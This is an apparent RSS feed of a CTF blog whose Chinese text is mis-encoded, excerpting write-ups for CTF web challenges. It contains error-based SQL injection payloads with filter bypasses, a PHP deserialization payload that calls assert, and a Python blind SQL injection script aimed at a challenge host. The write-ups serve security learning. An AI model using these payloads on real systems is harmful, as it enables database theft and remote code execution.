<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>CTF on</title><link>/categories/ctf/</link><description>Recent content in CTF on</description><generator>Hugo</generator><language>en</language><lastBuildDate>Wed, 18 Aug 2021 17:21:24 +0000</lastBuildDate><atom:link href="/categories/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>CISCNçº¿ä¸Šèµ›åº“å­˜</title><link>/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</link><pubDate>Wed, 18 Aug 2021 17:21:24 +0000</pubDate><guid>/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</guid><description>&lt;h1 id="easy_sql">easy_sql&lt;/h1>
&lt;p>åœ¨ç”¨æˆ·åå¤„ï¼Œå°è¯•sqlæ³¨å…¥ï¼ŒåŠ ä¸Šå•å¼•å·æŠ¥é”™ï¼Œæµ‹è¯•é—­åˆï¼Œéšä¾¿æ·»åŠ å‡ ä¸ªç¬¦å·åœ¨passwordçš„æŠ¥é”™é™„è¿‘ä¸­æ³¨æ„åˆ°äº†æ˜¯&lt;strong>æ‹¬å·å•å¼•å·é—­åˆ&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &amp;lsquo;1&amp;rsquo;) LIMIT 0,1&amp;rsquo; at line 1&lt;/p>
&lt;/blockquote>
&lt;p>è¿‡æ»¤çš„å­—ç¬¦æœ‰unionï¼Œæ‰€ä»¥å°è¯•æŠ¥é”™æ³¨å…¥ï¼ŒæŸ¥è¯¢ç‰ˆæœ¬å·ã€‚&lt;/p>
&lt;pre tabindex="0">&lt;code>admin&amp;#39;) and (extractvalue(1,concat(0x7e,(select version()),0x7e)))#
&lt;/code>&lt;/pre>&lt;p>æ¥ä¸‹æ¥æƒ³è¦é€šè¿‡&lt;strong>information_schema&lt;/strong>åº“æŸ¥å­—æ®µï¼Œä½†æ˜¯å‘ç°è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥çŒœè¡¨åå’Œå­—æ®µåï¼Œå°è¯•å‡ºäº†flagè¡¨å’Œè¡¨ä¸­çš„ä¸€ä¸ªå­—æ®µidï¼Œä½†æ˜¯åœ¨idå­—æ®µä¸­åªæŸ¥è¯¢å‡ºäº†ä¸€ä¸ªå€¼ï¼š1ï¼Œä½¿ç”¨sqlmapè·‘ä¹Ÿæ²¡è·‘å‡ºæ¥ã€‚&lt;/p>
&lt;p>æœ€åå‚è€ƒäº†ç½‘ä¸Šçš„ä¸€ç¯‡æ–‡ç« ï¼š&lt;a href="https://blog.csdn.net/weixin_35867608/article/details/113937118">mysql æ³¨å…¥ information_schema_ç»•è¿‡IDSè¿‡æ»¤information_schemaç»§ç»­æ³¨å…¥&lt;/a>ï¼Œæ¨¡ä»¿æ–‡ç« æ„é€ payload&lt;/p>
&lt;pre tabindex="0">&lt;code>admin&amp;#39;) and (extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag b USING (id))c),0x7e)))#
&lt;/code>&lt;/pre>&lt;p>å›æ˜¾ä¸ºï¼šDuplicate column name &amp;rsquo;no&amp;rsquo;ï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯æŠ¥äº†ä¸ªé”™ï¼Œä½†æ˜¯æ ¹æ®æ–‡ç« ä½¿ç”¨usingç»§ç»­æŠŠæŸ¥åˆ°çš„noå­—æ®µåŠ ä¸Šå»ï¼Œå‘ç°è¿˜æœ‰å…¶ä»–å­—æ®µ&lt;/p>
&lt;pre tabindex="0">&lt;code>Duplicate column name &amp;#39;28d9f90a-4120-4ee8-9079-4e7613699510&amp;#39;
&lt;/code>&lt;/pre>&lt;p>ç›´æ¥å¾—åˆ°ä¸€ä¸ªå‡çš„flagï¼ŒçœŸçš„è¿˜åœ¨flagè¡¨ä¸­ï¼ŒæŸ¥è¯¢flagè¡¨ä¸­çš„æ”¹å­—æ®µï¼ŒæŠ¥é”™æ³¨å…¥é•¿åº¦æœ‰é™åˆ¶ï¼Œæ‰€ä»¥åŠ ä¸ªsubsträ¸€æ®µä¸€æ®µæˆªå°±å‡ºæ¥äº†&lt;/p>
&lt;pre tabindex="0">&lt;code>admin&amp;#39;) and (extractvalue(1,concat(0x7e,substr((select `28d9f90a-4120-4ee8-9079-4e7613699510` from `flag`),1,30),0x7e)))#
&lt;/code>&lt;/pre>&lt;p>flagï¼šCISCN{SWAqt-siWro-Wi7jV-FTdRm-9iOkG-}&lt;/p>
&lt;h1 id="easy_source">easy_source&lt;/h1>
&lt;p>ä½¿ç”¨ç›®å½•æ‰«æï¼Œæ‰«æåˆ°äº†&lt;code>.index.php.swo&lt;/code>&lt;/p></description></item><item><title>ReadlezPHP&amp;EasySearch</title><link>/posts/ctf/readlezphpeasysearch/</link><pubDate>Tue, 20 Apr 2021 17:12:43 +0000</pubDate><guid>/posts/ctf/readlezphpeasysearch/</guid><description>&lt;h1 id="readlezphp">ReadlezPHP&lt;/h1>
&lt;p>æºç æ‰¾åˆ°&lt;code>time.php?source&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210420175641.png" alt="">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#error_reporting(0);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">HelloPhp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $a;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $b;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> __construct(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Y-m-d h:i:s&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;date&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> __destruct(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $a &lt;span style="color:#f92672">=&lt;/span> $this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $b &lt;span style="color:#f92672">=&lt;/span> $this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">b&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> $b($a);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$c &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">HelloPhp&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;source&amp;#39;&lt;/span>]))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">highlight_file&lt;/span>(&lt;span style="color:#66d9ef">__FILE__&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">@&lt;/span>$ppp &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">unserialize&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#34;data&amp;#34;&lt;/span>]);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åˆ†æä¸€æ³¢ï¼šæœ€åä¸€è¡Œä¸€ä¸ªååºåˆ—åŒ–ï¼Œæ‰€ä»¥å¾ˆæ˜æ˜¾æ˜¯ååºåˆ—åŒ–çš„é¢˜ç›®ï¼Œåœ¨&lt;code>HelloPhp&lt;/code>ä¸­æœ‰ä¸€ä¸ª&lt;code>__destruct&lt;/code>æ–¹æ³•ï¼Œä¼šåœ¨åˆ›å»ºçš„å¯¹è±¡é”€æ¯æ—¶æ‰§è¡Œï¼Œæ³¨æ„é‡Œé¢æœ‰ä¸€ä¸ªechoè¾“å‡ºï¼Œæœ€é‡è¦çš„æ˜¯åé¢çš„å‡½æ•°è°ƒç”¨ ï¼Œå¥½åƒæ˜¯åœ¨PHP7æŸä¸ªç‰ˆæœ¬ä¹‹ååªæ˜¯ä½¿ç”¨å½¢å¦‚&lt;code>$a($b)&lt;/code>æ ¼å¼è¿›è¡Œå‡½æ•°è°ƒç”¨ï¼Œå‡å¦‚å˜é‡&lt;code>a&lt;/code>ä¸ºå­—ç¬¦ä¸²&lt;code>var_dump&lt;/code>ï¼Œ&lt;code>b&lt;/code>æ˜¯ä»»æ„å­—ç¬¦ä¸²ï¼Œå°±ç›¸å½“äºè°ƒç”¨var_dumpå‡½æ•°ä¸”å‚æ•°ä¸ºbã€‚&lt;/p>
&lt;p>æ‰€ä»¥æ„é€ ååºåˆ—åŒ–ï¼Œè°ƒç”¨assertå‡½æ•°æ‰§è¡Œphpinfoã€‚å¦‚æœå‘&lt;strong>assert()&lt;/strong> å‡½æ•°ä¼ é€’å­—ç¬¦ä¸²ï¼Œå®ƒå°†ä¼šè¢« &lt;strong>assert()&lt;/strong> å½“åš PHP ä»£ç æ¥æ‰§è¡Œ)ï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
class HelloPhp
{
 public $a=&amp;#39;phpinfo()&amp;#39;;
 public $b=&amp;#39;assert&amp;#39;;
}

$s=new HelloPhp();
echo serialize($s);
&lt;/code>&lt;/pre>&lt;p>POSTè¯·æ±‚&lt;/p>
&lt;pre tabindex="0">&lt;code>time.php?data=O:8:&amp;#34;HelloPhp&amp;#34;:2:{s:1:&amp;#34;a&amp;#34;;s:9:&amp;#34;phpinfo()&amp;#34;;s:1:&amp;#34;b&amp;#34;;s:6:&amp;#34;assert&amp;#34;;}
&lt;/code>&lt;/pre>&lt;p>é¡µé¢æŸ¥æ‰¾flagï¼Œåœ¨environmentä¸­æ‰¾åˆ°flag&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210420175822.png" alt="">&lt;/p>
&lt;h1 id="easysearch">EasySearch&lt;/h1>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210420171541.png" alt="">&lt;/p>
&lt;p>è¿›å…¥é¡µé¢ä»¥åè¯•äº†è¯•sqlæ³¨å…¥å‘ç°æ²¡ç”¨ã€‚ç¬¬ä¸€æ­¥æ˜¯çœ‹äº†wpæ‰¾åˆ°çš„ï¼šä½¿ç”¨æ‰«æå™¨æ‰«æåˆ°&lt;code>index.php.swp&lt;/code>æ–‡ä»¶ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#a6e22e">ob_start&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">get_hash&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		$chars &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;amp;*()+-&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		$random &lt;span style="color:#f92672">=&lt;/span> $chars[&lt;span style="color:#a6e22e">mt_rand&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">73&lt;/span>)]&lt;span style="color:#f92672">.&lt;/span>$chars[&lt;span style="color:#a6e22e">mt_rand&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">73&lt;/span>)]&lt;span style="color:#f92672">.&lt;/span>$chars[&lt;span style="color:#a6e22e">mt_rand&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">73&lt;/span>)]&lt;span style="color:#f92672">.&lt;/span>$chars[&lt;span style="color:#a6e22e">mt_rand&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">73&lt;/span>)]&lt;span style="color:#f92672">.&lt;/span>$chars[&lt;span style="color:#a6e22e">mt_rand&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">73&lt;/span>)];&lt;span style="color:#75715e">//Random 5 times
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>		$content &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">uniqid&lt;/span>()&lt;span style="color:#f92672">.&lt;/span>$random;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">sha1&lt;/span>($content); 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Content-Type: text/html;charset=utf-8&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#f92672">***&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_POST[&lt;span style="color:#e6db74">&amp;#39;username&amp;#39;&lt;/span>]) &lt;span style="color:#66d9ef">and&lt;/span> $_POST[&lt;span style="color:#e6db74">&amp;#39;username&amp;#39;&lt;/span>] &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $admin &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;6d0bc1&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( $admin &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#a6e22e">substr&lt;/span>(&lt;span style="color:#a6e22e">md5&lt;/span>($_POST[&lt;span style="color:#e6db74">&amp;#39;password&amp;#39;&lt;/span>]),&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">6&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;[+] Welcome to manage system&amp;#39;)&amp;lt;/script&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $file_shtml &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;public/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">get_hash&lt;/span>()&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;.shtml&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $shtml &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fopen&lt;/span>($file_shtml, &lt;span style="color:#e6db74">&amp;#34;w&amp;#34;&lt;/span>) &lt;span style="color:#66d9ef">or&lt;/span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Unable to open file!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $text &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> ***
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> ***
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;lt;h1&amp;gt;Hello,&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$_POST[&lt;span style="color:#e6db74">&amp;#39;username&amp;#39;&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;lt;/h1&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> ***
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">			***&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">fwrite&lt;/span>($shtml,$text);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">fclose&lt;/span>($shtml);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">***&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;[!] Header error ...&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;[!] Failed&amp;#39;)&amp;lt;/script&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#f92672">***&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#f92672">***&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç™»é™†åŠŸèƒ½åˆä¸€ä¸ªéªŒè¯ï¼Œéœ€è¦ä¼ å…¥çš„&lt;code>passwd&lt;/code>å‚æ•°ä½¿ç”¨&lt;strong>md5&lt;/strong>åŠ å¯†ä»¥åæ˜¯ä»¥&lt;strong>6d0bc1&lt;/strong>å¼€å¤´çš„ã€‚ç®€å•å†™ä¸ªè„šæœ¬è·‘ä¸€ä¸‹å°±æœ‰äº†ï¼š&lt;/p></description></item><item><title>æå®¢å¤§æŒ‘æˆ˜ 2019 FinalSQL</title><link>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019finalsql/</link><pubDate>Sun, 18 Apr 2021 19:11:51 +0000</pubDate><guid>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019finalsql/</guid><description>&lt;p>è¿˜æ˜¯åŒä¸€åœºæ¯”èµ›çš„ç•Œé¢&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210416224503.png" alt="">&lt;/p>
&lt;p>è¿™æ¬¡æµ‹è¯•äº†ä¸‹é¢çš„ç™»é™†æ¡†å·²ç»ä¸èƒ½ç”¨äº†ï¼Œæ— è®ºæ€ä¹ˆè¾“å…¥éƒ½æ˜¯åŒä¸€ä¸ªå›æ˜¾ï¼š&lt;strong>ä½ å¯åˆ«è¢«æˆ‘é€®ä½äº†ï¼Œè‡­å¼Ÿå¼Ÿ&lt;/strong>ï¼Œæµ‹è¯•ä¸Šé¢çš„åºå·ï¼Œæ³¨æ„æ­¤æ—¶çš„urlä¸­æœ‰&lt;code>?id=&lt;/code>çŒœæµ‹æ˜¯ä¸€ä¸ªæ³¨å…¥ç‚¹ï¼Œè¾“å…¥å•å¼•å·ä¸€ç›´æŠ¥é”™ï¼Œä½†æ˜¯è¾“å…¥2-1æ—¶æˆåŠŸå›æ˜¾ï¼Œåˆ¤æ–­æ˜¯ä¸€ä¸ª&lt;strong>æ•°å­—å‹&lt;/strong>æ³¨å…¥ï¼Œæ•°å­—å‹æ³¨å…¥æœ€å¤šé‡åˆ°çš„å°±æ˜¯ç»“åˆç›²æ³¨ï¼Œæ¥ä¸‹æ¥æ˜¯æµ‹è¯•ç›²æ³¨çš„è¿‡æ»¤ã€‚&lt;/p>
&lt;p>å‘ç°ifã€unionã€andç­‰è¢«è¿‡æ»¤ï¼Œåœ¨æ•´ä¸ªå­—ç¬¦ä¸²ä¸­å¦‚æœå‡ºç°ç©ºæ ¼ä¼šè¢«æ‹¦ä¸‹ï¼Œordã€asciiç­‰è½¬æ¢å­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œifè¢«è¿‡æ»¤å¯ä»¥ä½¿ç”¨strcmpå‡½æ•°ç­‰ä»£æ›¿ï¼Œç©ºæ ¼å¯ä»¥ä½¿ç”¨æ‹¬å·ç»•è¿‡ã€‚&lt;/p>
&lt;p>è´´å‡ºæ¥è‡ªå·±çš„è„šæœ¬ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># codeing=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> requests
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> time
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>url&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;http://1e069783-5d06-4d70-af82-c457e0d11a52.node3.buuoj.cn/search.php?id=&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>result&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">100&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	high &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">127&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	low &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	mid &lt;span style="color:#f92672">=&lt;/span> (low &lt;span style="color:#f92672">+&lt;/span> high) &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">while&lt;/span> high&lt;span style="color:#f92672">&amp;gt;&lt;/span>low:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#75715e"># sql=&amp;#34;(ORD(SUBSTR((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))=%d)&amp;#34;%(i,c)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#75715e"># sql = &amp;#34;(ORD(SUBSTR((select(group_concat(column_name))from(information_schema.columns)where(table_name=&amp;#39;F1naI1y&amp;#39;)),%d,1))&amp;gt;%d)&amp;#34; % (x, mid)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		sql &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;(ORD(SUBSTR((select(group_concat(password))from(F1naI1y)where(id=9)),&lt;/span>&lt;span style="color:#e6db74">%d&lt;/span>&lt;span style="color:#e6db74">,1))&amp;gt;&lt;/span>&lt;span style="color:#e6db74">%d&lt;/span>&lt;span style="color:#e6db74">)&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (x, mid)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">0.1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		reponse&lt;span style="color:#f92672">=&lt;/span>requests&lt;span style="color:#f92672">.&lt;/span>get(url&lt;span style="color:#f92672">+&lt;/span>sql)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Click&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> reponse&lt;span style="color:#f92672">.&lt;/span>text:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			low&lt;span style="color:#f92672">=&lt;/span>mid&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			high &lt;span style="color:#f92672">=&lt;/span> mid
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		mid &lt;span style="color:#f92672">=&lt;/span> (low&lt;span style="color:#f92672">+&lt;/span>high)&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	result &lt;span style="color:#f92672">+=&lt;/span> chr(int(mid))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	print(result)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ‘æ˜¯ç›´æ¥ä½¿ç”¨äº†åˆ¤æ–­å­—ç¬¦çš„è¿”å›å€¼1æˆ–0ä½œä¸ºidçš„å‚æ•°ï¼Œå› ä¸ºä½¿ç”¨&lt;strong>group_concat&lt;/strong>æ‹¼æ¥æ—¶å­—ç¬¦ä¸²æœ‰é€—å·&lt;code>,&lt;/code>æ‰€ä»¥å­—ç¬¦asciiéœ€è¦è‡³å°‘ä»44å¼€å§‹ã€‚&lt;/p>
